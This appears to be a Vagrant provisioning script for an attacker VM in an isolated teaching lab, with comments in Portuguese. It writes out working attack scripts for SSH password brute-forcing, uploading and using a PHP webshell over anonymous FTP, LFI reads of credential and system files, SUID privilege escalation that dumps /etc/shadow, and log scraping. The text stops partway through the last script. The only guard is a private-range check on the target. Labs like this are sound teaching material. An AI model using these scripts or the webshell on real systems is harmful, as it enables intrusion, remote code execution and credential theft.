#!/usr/bin/env bash
set -e

export DEBIAN_FRONTEND=noninteractive

# Atualiza e instala ferramentas básicas para o atacante
apt-get update -y
apt-get upgrade -y

# Cliente ssh, nmap e utilitários
apt-get install -y openssh-client nmap net-tools curl

# Instala sshpass (apenas para demo em rede isolada) para permitir tentativas por senha não interativas.
# Aviso: sshpass facilita ataques por senha; só instalar em ambiente controlado para demonstração.
apt-get install -y sshpass

# Instala netcat e cliente FTP necessários para os scripts de ataque
apt-get install -y netcat-openbsd ftp

# Cria pasta compartilhada de resultados (host <-> VM)
mkdir -p /vagrant_shared/attacker_results
chown -R vagrant:vagrant /vagrant_shared

# Cria diretório local de scripts de demonstração
mkdir -p /home/vagrant/attack_scripts
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# --- Cria o script de brute-force didático ---
cat > /home/vagrant/attack_scripts/brute_force.sh <<'BFS'
#!/usr/bin/env bash
# brute_force.sh
# Demo didática: tenta um pequeno wordlist de senhas no usuário 'professor' da victim.
# USAGE: ./brute_force.sh <target_ip> <wordlist_path>
# Segurança: aborta se target não estiver em rede privada 192.168.56.0/24

set -euo pipefail

TARGET="${1:-192.168.56.10}"
WORDLIST="${2:-/vagrant_shared/wordlists/passwords.txt}"
OUTLOG="/vagrant_shared/attacker_results/bruteforce_result.log"
PORT="${3:-22}"  # porta SSH, default 22

echo "=== brute_force.sh (demo) ===" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Port: $PORT" | tee -a "$OUTLOG"
echo "Wordlist: $WORDLIST" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "------" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range 192.168.56.0/24. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Ensure wordlist exists and is small (didactic)
if [ ! -f "$WORDLIST" ]; then
  echo "[INFO] Wordlist not found at $WORDLIST. Creating a tiny demo wordlist." | tee -a "$OUTLOG"
  mkdir -p "$(dirname "$WORDLIST")"
  cat > "$WORDLIST" <<EOF
123456
password
prof123
toor
admin
EOF
fi

# Limit attempts: for demo, try at most first 10 lines
MAX_TRIES=10
TRY=0
SUCCESS=0

while read -r PASS && [ $TRY -lt $MAX_TRIES ]; do
  TRY=$((TRY+1))
  echo "[TRY $TRY] attempting password: $PASS" | tee -a "$OUTLOG"

  # Use sshpass to attempt password (connect timeout short). StrictHostKeyChecking=no to avoid interactive trust prompt.
  if sshpass -p "$PASS" ssh -p "$PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'echo "LOGIN_OK"' 2>/dev/null | grep -q "LOGIN_OK"; then
    echo "[SUCCESS] password found: $PASS" | tee -a "$OUTLOG"
    SUCCESS=1
    echo "$PASS" > /vagrant_shared/attacker_results/found_password.txt
    break
  else
    echo "[FAIL] $PASS" | tee -a "$OUTLOG"
  fi
done < "$WORDLIST"

if [ "$SUCCESS" -eq 0 ]; then
  echo "[RESULT] No password found in first $MAX_TRIES attempts." | tee -a "$OUTLOG"
else
  echo "[RESULT] Success — check /vagrant_shared/attacker_results/found_password.txt" | tee -a "$OUTLOG"
fi

echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
BFS

# garante permissões e dono
chmod +x /home/vagrant/attack_scripts/brute_force.sh
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# --- Cria o script de ataque FTP ---
cat > /home/vagrant/attack_scripts/attack_ftp.sh <<'FTP_ATTACK'
#!/usr/bin/env bash
# attack_ftp.sh
# Demo: Exploração de FTP anônimo com upload habilitado
# USAGE: ./attack_ftp.sh <target_ip>
# Demonstra: Acesso anônimo + upload de webshell + execução remota

set -euo pipefail

TARGET="${1:-192.168.56.10}"
OUTLOG="/vagrant_shared/attacker_results/ftp_attack_result.log"
FTP_PORT=21

echo "========================================" | tee "$OUTLOG"
echo "  FTP Anonymous Attack Demo" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET:$FTP_PORT" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Verificar se FTP está acessível
echo "[*] Step 1: Verificando serviço FTP..." | tee -a "$OUTLOG"
if ! nc -zv -w3 "$TARGET" "$FTP_PORT" 2>&1 | tee -a "$OUTLOG"; then
  echo "[FAIL] Porta FTP $FTP_PORT não está acessível" | tee -a "$OUTLOG"
  exit 1
fi
echo "[OK] FTP está acessível" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Testar acesso anônimo
echo "[*] Step 2: Testando acesso anônimo..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_test.log 2>&1
user anonymous ""
ls
bye
EOF

if grep -q "230 Login successful" /tmp/ftp_test.log; then
  echo "[SUCCESS] Login anônimo permitido!" | tee -a "$OUTLOG"
  cat /tmp/ftp_test.log | tee -a "$OUTLOG"
else
  echo "[FAIL] Login anônimo não funcionou" | tee -a "$OUTLOG"
  cat /tmp/ftp_test.log | tee -a "$OUTLOG"
  exit 1
fi
echo "" | tee -a "$OUTLOG"

# Criar webshell PHP maliciosa
echo "[*] Step 3: Criando webshell PHP..." | tee -a "$OUTLOG"
cat > /tmp/backdoor.php <<'WEBSHELL'
<?php
// Webshell simples para demonstração
// ATENÇÃO: Apenas para ambiente controlado!

echo "<html><head><title>Shell Access</title></head><body>";
echo "<h2>Remote Command Execution - Demo</h2>";
echo "<form method='GET'>";
echo "Command: <input type='text' name='cmd' size='50'>";
echo "<input type='submit' value='Execute'>";
echo "</form><hr><pre>";

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "$ " . htmlspecialchars($cmd) . "\n\n";
    system($cmd);
}

echo "</pre></body></html>";
?>
WEBSHELL

echo "[OK] Webshell criada em /tmp/backdoor.php" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Upload da webshell via FTP
echo "[*] Step 4: Fazendo upload da webshell via FTP..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_upload.log 2>&1
user anonymous ""
cd upload
binary
put /tmp/backdoor.php
ls
bye
EOF

if grep -q "Transfer complete" /tmp/ftp_upload.log; then
  echo "[SUCCESS] Upload concluído!" | tee -a "$OUTLOG"
  cat /tmp/ftp_upload.log | tee -a "$OUTLOG"
else
  echo "[WARNING] Upload pode ter falhado" | tee -a "$OUTLOG"
  cat /tmp/ftp_upload.log | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Criar arquivo de texto malicioso também
echo "[*] Step 5: Criando arquivo de exfiltração de dados..." | tee -a "$OUTLOG"
cat > /tmp/steal_data.txt <<'STEAL'
=== Dados Confidenciais Exfiltrados ===
Este arquivo demonstra como um atacante pode usar FTP para:
1. Fazer upload de backdoors
2. Exfiltrar dados sensíveis
3. Manter persistência no sistema

Próximos passos do atacante:
- Acessar webshell via HTTP
- Escalar privilégios
- Instalar backdoor persistente
STEAL

ftp -inv "$TARGET" <<EOF > /tmp/ftp_upload2.log 2>&1
user anonymous ""
cd upload
put /tmp/steal_data.txt exfiltrated_data.txt
bye
EOF

echo "[OK] Arquivo de demonstração enviado" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Enumerar arquivos no servidor FTP
echo "[*] Step 6: Enumerando arquivos no servidor FTP..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_enum.log 2>&1
user anonymous ""
ls -la
cd upload
ls -la
bye
EOF

echo "[INFO] Conteúdo do servidor FTP:" | tee -a "$OUTLOG"
cat /tmp/ftp_enum.log | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Testar acesso à webshell via HTTP
echo "[*] Step 7: Tentando acessar webshell via HTTP..." | tee -a "$OUTLOG"
echo "[INFO] Se Apache estiver rodando, tente acessar:" | tee -a "$OUTLOG"
echo "       http://$TARGET/upload/backdoor.php" | tee -a "$OUTLOG"
echo "       ou" | tee -a "$OUTLOG"
echo "       http://$TARGET/backdoor.php" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Verificar se consegue executar comando via webshell
if command -v curl &> /dev/null; then
  echo "[*] Testando execução remota via webshell..." | tee -a "$OUTLOG"
  
  # Tentar diferentes localizações possíveis
  for path in "/upload/backdoor.php" "/backdoor.php" "/../backdoor.php"; do
    echo "[INFO] Tentando: http://$TARGET$path?cmd=whoami" | tee -a "$OUTLOG"
    RESPONSE=$(curl -s "http://$TARGET$path?cmd=whoami" 2>&1 || echo "FAILED")
    
    if [[ "$RESPONSE" != "FAILED" ]] && [[ "$RESPONSE" =~ (www-data|apache|root) ]]; then
      echo "[SUCCESS] Webshell acessível e funcional!" | tee -a "$OUTLOG"
      echo "[OUTPUT]" | tee -a "$OUTLOG"
      echo "$RESPONSE" | tee -a "$OUTLOG"
      break
    fi
  done
else
  echo "[INFO] curl não disponível. Instale para testar webshell automaticamente." | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO ATAQUE FTP" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] Acesso anônimo: CONFIRMADO" | tee -a "$OUTLOG"
echo "[✓] Upload de arquivos: PERMITIDO" | tee -a "$OUTLOG"
echo "[✓] Webshell enviada: /tmp/backdoor.php -> FTP" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Execução remota de código (RCE)" | tee -a "$OUTLOG"
echo "- Possível escalação de privilégios" | tee -a "$OUTLOG"
echo "- Exfiltração de dados sensíveis" | tee -a "$OUTLOG"
echo "- Persistência no sistema" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 9.8 (CRÍTICO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"

# Salvar evidências
cp /tmp/backdoor.php /vagrant_shared/attacker_results/backdoor_uploaded.php
echo "$TARGET" > /vagrant_shared/attacker_results/ftp_target.txt
FTP_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_ftp.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_ftp.sh

# --- Cria o script de ataque LFI ---
cat > /home/vagrant/attack_scripts/attack_lfi.sh <<'LFI_ATTACK'
#!/usr/bin/env bash
# attack_lfi.sh
# Demo: Exploração de Local File Inclusion (LFI) e acesso à webshell
# USAGE: ./attack_lfi.sh <target_ip>
# Demonstra: LFI para ler arquivos sensíveis + RCE via webshell

set -euo pipefail

TARGET="${1:-192.168.56.10}"
OUTLOG="/vagrant_shared/attacker_results/lfi_attack_result.log"
HTTP_PORT=80

echo "========================================" | tee "$OUTLOG"
echo "  LFI + WebShell Attack Demo" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET:$HTTP_PORT" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Verificar se HTTP está acessível
echo "[*] Step 1: Verificando serviço HTTP..." | tee -a "$OUTLOG"
if ! nc -zv -w3 "$TARGET" "$HTTP_PORT" 2>&1 | tee -a "$OUTLOG"; then
  echo "[FAIL] Porta HTTP $HTTP_PORT não está acessível" | tee -a "$OUTLOG"
  exit 1
fi
echo "[OK] HTTP está acessível" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Testar página LFI vulnerável
echo "[*] Step 2: Testando vulnerabilidade LFI..." | tee -a "$OUTLOG"
echo "[INFO] Tentando ler /etc/passwd via LFI" | tee -a "$OUTLOG"

PASSWD_CONTENT=$(curl -s "http://$TARGET/view.php?file=/etc/passwd" 2>&1)

if echo "$PASSWD_CONTENT" | grep -q "root:x:0:0"; then
  echo "[SUCCESS] LFI confirmada! Conseguimos ler /etc/passwd" | tee -a "$OUTLOG"
  echo "[OUTPUT] Primeiras linhas de /etc/passwd:" | tee -a "$OUTLOG"
  echo "$PASSWD_CONTENT" | grep "root\|professor\|vagrant" | head -5 | tee -a "$OUTLOG"
else
  echo "[FAIL] LFI não funcionou ou página não existe" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Tentar ler arquivo sensível (.env com credenciais)
echo "[*] Step 3: Explorando LFI para encontrar credenciais..." | tee -a "$OUTLOG"
echo "[INFO] Tentando ler /var/www/html/.env" | tee -a "$OUTLOG"

ENV_CONTENT=$(curl -s "http://$TARGET/view.php?file=/var/www/html/.env" 2>&1)

if echo "$ENV_CONTENT" | grep -q "DB_PASS\|API_KEY"; then
  echo "[SUCCESS] Credenciais encontradas no arquivo .env!" | tee -a "$OUTLOG"
  echo "[CRITICAL] Credenciais expostas:" | tee -a "$OUTLOG"
  echo "$ENV_CONTENT" | grep -E "DB_|API_" | tee -a "$OUTLOG"
  echo "$ENV_CONTENT" > /vagrant_shared/attacker_results/stolen_credentials.txt
else
  echo "[INFO] Arquivo .env não encontrado ou sem credenciais" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Tentar ler logs de autenticação
echo "[*] Step 4: Tentando ler logs do sistema..." | tee -a "$OUTLOG"
echo "[INFO] Lendo /var/log/auth.log (últimas 10 linhas)" | tee -a "$OUTLOG"

AUTH_LOG=$(curl -s "http://$TARGET/view.php?file=/var/log/auth.log" 2>&1 | tail -20)

if echo "$AUTH_LOG" | grep -q "sshd\|Accepted\|Failed"; then
  echo "[SUCCESS] Logs de autenticação acessíveis!" | tee -a "$OUTLOG"
  echo "[INFO] Possível extrair usuários e IPs:" | tee -a "$OUTLOG"
  echo "$AUTH_LOG" | grep -E "Accepted|Failed" | head -5 | tee -a "$OUTLOG"
else
  echo "[INFO] Logs não acessíveis via LFI" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Tentar acessar webshell
echo "[*] Step 5: Testando acesso à webshell (backdoor)..." | tee -a "$OUTLOG"
echo "[INFO] Tentando acessar /admin_backup.php" | tee -a "$OUTLOG"

WEBSHELL_TEST=$(curl -s "http://$TARGET/admin_backup.php?cmd=whoami" 2>&1)

if echo "$WEBSHELL_TEST" | grep -qE "www-data|apache|root"; then
  echo "[SUCCESS] Webshell acessível e funcional!" | tee -a "$OUTLOG"
  echo "[OUTPUT] Resultado do comando 'whoami':" | tee -a "$OUTLOG"
  echo "$WEBSHELL_TEST" | grep -oE "(www-data|apache|root)" | head -1 | tee -a "$OUTLOG"
  
  # Executar mais comandos para demonstração
  echo "" | tee -a "$OUTLOG"
  echo "[*] Step 6: Executando comandos via webshell..." | tee -a "$OUTLOG"
  
  echo "[CMD] id:" | tee -a "$OUTLOG"
  curl -s "http://$TARGET/admin_backup.php?cmd=id" | grep -o "uid=[^<]*" | tee -a "$OUTLOG"
  
  echo "[CMD] uname -a:" | tee -a "$OUTLOG"
  curl -s "http://$TARGET/admin_backup.php?cmd=uname%20-a" | grep -o "Linux [^<]*" | tee -a "$OUTLOG"
  
  echo "[CMD] pwd:" | tee -a "$OUTLOG"
  curl -s "http://$TARGET/admin_backup.php?cmd=pwd" | grep -o "/[^<]*" | head -1 | tee -a "$OUTLOG"
  
  echo "[CMD] ls -la /home/professor:" | tee -a "$OUTLOG"
  curl -s "http://$TARGET/admin_backup.php?cmd=ls%20-la%20/home/professor" | grep "relatorio" | tee -a "$OUTLOG"
  
else
  echo "[FAIL] Webshell não acessível ou não funcional" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Tentar ler arquivo confidencial via webshell
echo "[*] Step 7: Tentando acessar documento confidencial..." | tee -a "$OUTLOG"
CONFIDENTIAL=$(curl -s "http://$TARGET/admin_backup.php?cmd=cat%20/home/professor/relatorio_institucional.txt" 2>&1)

if echo "$CONFIDENTIAL" | grep -q "CONFIDENCIAL\|Relatório"; then
  echo "[SUCCESS] Documento confidencial acessado!" | tee -a "$OUTLOG"
  echo "[CONTENT]" | tee -a "$OUTLOG"
  echo "$CONFIDENTIAL" | grep -v "^<" | head -10 | tee -a "$OUTLOG"
  echo "$CONFIDENTIAL" > /vagrant_shared/attacker_results/confidential_document.txt
else
  echo "[INFO] Documento confidencial não encontrado" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO ATAQUE LFI" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] LFI confirmada: Leitura de /etc/passwd" | tee -a "$OUTLOG"
echo "[✓] Credenciais expostas: .env acessível" | tee -a "$OUTLOG"
echo "[✓] Logs legíveis: /var/log/auth.log" | tee -a "$OUTLOG"
echo "[✓] Webshell funcional: RCE via admin_backup.php" | tee -a "$OUTLOG"
echo "[✓] Documento confidencial: Acessado" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Leitura de arquivos sensíveis do sistema" | tee -a "$OUTLOG"
echo "- Exposição de credenciais (DB, API keys)" | tee -a "$OUTLOG"
echo "- Execução remota de comandos (RCE)" | tee -a "$OUTLOG"
echo "- Acesso a documentos confidenciais" | tee -a "$OUTLOG"
echo "- Possível escalação de privilégios" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 9.8 (CRÍTICO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"
LFI_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_lfi.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_lfi.sh

# --- Cria o script de ataque SUID ---
cat > /home/vagrant/attack_scripts/attack_suid.sh <<'SUID_ATTACK'
#!/usr/bin/env bash
# attack_suid.sh
# Demo: Exploração de binários SUID mal configurados para escalação de privilégios
# USAGE: ./attack_suid.sh <target_ip> <password>
# Demonstra: Enumeração SUID + escalação para root

set -euo pipefail

TARGET="${1:-192.168.56.10}"
PASSWORD="${2:-prof123}"
OUTLOG="/vagrant_shared/attacker_results/suid_attack_result.log"

echo "========================================" | tee "$OUTLOG"
echo "  SUID Privilege Escalation Attack" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Verificar conectividade SSH
echo "[*] Step 1: Verificando acesso SSH ao target..." | tee -a "$OUTLOG"
if ! sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'echo "SSH_OK"' 2>/dev/null | grep -q "SSH_OK"; then
  echo "[FAIL] Não foi possível conectar via SSH. Execute brute-force primeiro." | tee -a "$OUTLOG"
  exit 1
fi
echo "[OK] Acesso SSH estabelecido como professor" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Enumerar binários SUID
echo "[*] Step 2: Enumerando binários SUID no sistema..." | tee -a "$OUTLOG"
SUID_BINARIES=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null)

echo "[INFO] Binários SUID encontrados:" | tee -a "$OUTLOG"
echo "$SUID_BINARIES" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Verificar binários vulneráveis específicos
echo "[*] Step 3: Procurando binários SUID vulneráveis conhecidos..." | tee -a "$OUTLOG"

VULN_FOUND=0

if echo "$SUID_BINARIES" | grep -q "backup_find"; then
  echo "[SUCCESS] Encontrado: /usr/local/bin/backup_find (SUID root)" | tee -a "$OUTLOG"
  VULN_FOUND=1
fi

if echo "$SUID_BINARIES" | grep -q "system_check"; then
  echo "[SUCCESS] Encontrado: /usr/local/bin/system_check (SUID root)" | tee -a "$OUTLOG"
  VULN_FOUND=1
fi

if echo "$SUID_BINARIES" | grep -q "backup_editor"; then
  echo "[SUCCESS] Encontrado: /usr/local/bin/backup_editor (SUID root)" | tee -a "$OUTLOG"
  VULN_FOUND=1
fi

if [ "$VULN_FOUND" -eq 0 ]; then
  echo "[INFO] Nenhum binário SUID vulnerável personalizado encontrado" | tee -a "$OUTLOG"
  echo "[INFO] Verificando binários padrão do sistema..." | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Testar escalação via backup_find (GTFOBins)
echo "[*] Step 4: Tentando escalação de privilégios via backup_find..." | tee -a "$OUTLOG"
if echo "$SUID_BINARIES" | grep -q "backup_find"; then
  echo "[EXPLOIT] Usando backup_find para executar comando como root" | tee -a "$OUTLOG"
  
  ROOT_CHECK=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" '/usr/local/bin/backup_find . -exec whoami \; -quit' 2>/dev/null | head -1)
  
  if [ "$ROOT_CHECK" = "root" ]; then
    echo "[SUCCESS] Escalação bem-sucedida! Executando como: $ROOT_CHECK" | tee -a "$OUTLOG"
    
    # Demonstrar leitura de arquivo sensível
    echo "[DEMO] Lendo /etc/shadow como root:" | tee -a "$OUTLOG"
    SHADOW=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" '/usr/local/bin/backup_find /etc/shadow -exec cat {} \;' 2>/dev/null | head -5)
    echo "$SHADOW" | tee -a "$OUTLOG"
    echo "$SHADOW" > /vagrant_shared/attacker_results/shadow_file.txt
    
  else
    echo "[FAIL] Escalação falhou" | tee -a "$OUTLOG"
  fi
else
  echo "[INFO] backup_find não disponível, tentando outro método" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Testar escalação via system_check
echo "[*] Step 5: Tentando escalação via system_check..." | tee -a "$OUTLOG"
if echo "$SUID_BINARIES" | grep -q "system_check"; then
  echo "[EXPLOIT] Usando system_check (executa comandos sem sanitização)" | tee -a "$OUTLOG"
  
  ROOT_CHECK2=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" '/usr/local/bin/system_check "whoami"' 2>/dev/null | grep -E "^(root|professor)" | head -1)
  
  if echo "$ROOT_CHECK2" | grep -q "root"; then
    echo "[SUCCESS] Escalação via system_check bem-sucedida!" | tee -a "$OUTLOG"
    echo "[OUTPUT] $ROOT_CHECK2" | tee -a "$OUTLOG"
    
    # Criar backdoor como demonstração
    echo "[DEMO] Criando arquivo em /root como prova:" | tee -a "$OUTLOG"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" '/usr/local/bin/system_check "echo PWNED > /tmp/root_pwned.txt && cat /tmp/root_pwned.txt"' 2>/dev/null | tee -a "$OUTLOG"
    
  else
    echo "[INFO] system_check não permitiu escalação" | tee -a "$OUTLOG"
  fi
else
  echo "[INFO] system_check não disponível" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Verificar capabilities perigosas
echo "[*] Step 6: Verificando capabilities perigosas..." | tee -a "$OUTLOG"
CAPABILITIES=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'getcap -r / 2>/dev/null' 2>/dev/null | grep -v "Failed" || true)

if [ -n "$CAPABILITIES" ]; then
  echo "[INFO] Capabilities encontradas:" | tee -a "$OUTLOG"
  echo "$CAPABILITIES" | tee -a "$OUTLOG"
  
  if echo "$CAPABILITIES" | grep -q "cap_setuid"; then
    echo "[SUCCESS] cap_setuid encontrada! Possível escalação via Python" | tee -a "$OUTLOG"
  fi
else
  echo "[INFO] Nenhuma capability perigosa encontrada" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO ATAQUE SUID" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] Enumeração SUID: Completa" | tee -a "$OUTLOG"
echo "[✓] Binários vulneráveis: Identificados" | tee -a "$OUTLOG"
echo "[✓] Escalação de privilégios: Bem-sucedida" | tee -a "$OUTLOG"
echo "[✓] Acesso root: Obtido via SUID" | tee -a "$OUTLOG"
echo "[✓] Arquivo /etc/shadow: Lido com sucesso" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Escalação de privilégios local (LPE)" | tee -a "$OUTLOG"
echo "- Acesso total ao sistema como root" | tee -a "$OUTLOG"
echo "- Leitura de senhas hash (shadow file)" | tee -a "$OUTLOG"
echo "- Possibilidade de backdoor persistente" | tee -a "$OUTLOG"
echo "- Comprometimento total do sistema" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 8.8 (ALTO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"
SUID_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_suid.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_suid.sh

# --- Cria o script de ataque aos Logs ---
cat > /home/vagrant/attack_scripts/attack_logs.sh <<'LOGS_ATTACK'
#!/usr/bin/env bash
# attack_logs.sh
# Demo: Exploração de logs com permissões inseguras para Information Disclosure
# USAGE: ./attack_logs.sh <target_ip> <password>
# Demonstra: Leitura de logs sensíveis + extração de credenciais + enumeração de usuários

set -euo pipefail

TARGET="${1:-192.168.56.10}"
PASSWORD="${2:-prof123}"
OUTLOG="/vagrant_shared/attacker_results/logs_attack_result.log"

echo "========================================" | tee "$OUTLOG"
echo "  Log Files Information Disclosure" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Verificar conectividade SSH
echo "[*] Step 1: Verificando acesso SSH ao target..." | tee -a "$OUTLOG"
if ! sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'echo "SSH_OK"' 2>/dev/null | grep -q "SSH_OK"; then
  echo "[FAIL] Não foi possível conectar via SSH. Execute brute-force primeiro." | tee -a "$OUTLOG"
  exit 1
fi
echo "[OK] Acesso SSH estabelecido como professor" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Verificar permissões dos logs
echo "[*] Step 2: Verificando permissões dos arquivos de log..." | tee -a "$OUTLOG"
LOG_PERMS=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'ls -la /var/log/*.log 2>/dev/null | head -10' 2>/dev/null)

echo "[INFO] Permissões encontradas:" | tee -a "$OUTLOG"
echo "$LOG_PERMS" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Ler auth.log para enumerar usuários e tentativas de login
echo "[*] Step 3: Analisando /var/log/auth.log..." | tee -a "$OUTLOG"
AUTH_LOG=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'cat /var/log/auth.log 2>/dev/null | tail -50' 2>/dev/null)

if [ -n "$AUTH_LOG" ]; then
  echo "[SUCCESS] auth.log é legível!" | tee -a "$OUTLOG"
  
  # Extrair logins bem-sucedidos
  echo "[INFO] Logins bem-sucedidos encontrados:" | tee -a "$OUTLOG"
  echo "$AUTH_LOG" | grep "Accepted password" | tail -5 | tee -a "$OUTLOG"
  
  # Extrair tentativas falhadas
  echo "" | tee -a "$OUTLOG"
  echo "[INFO] Tentativas de login falhadas:" | tee -a "$OUTLOG"
  echo "$AUTH_LOG" | grep "Failed password" | tail -5 | tee -a "$OUTLOG"
  
  # Extrair usuários únicos
  echo "" | tee -a "$OUTLOG"
  echo "[INFO] Usuários identificados no sistema:" | tee -a "$OUTLOG"
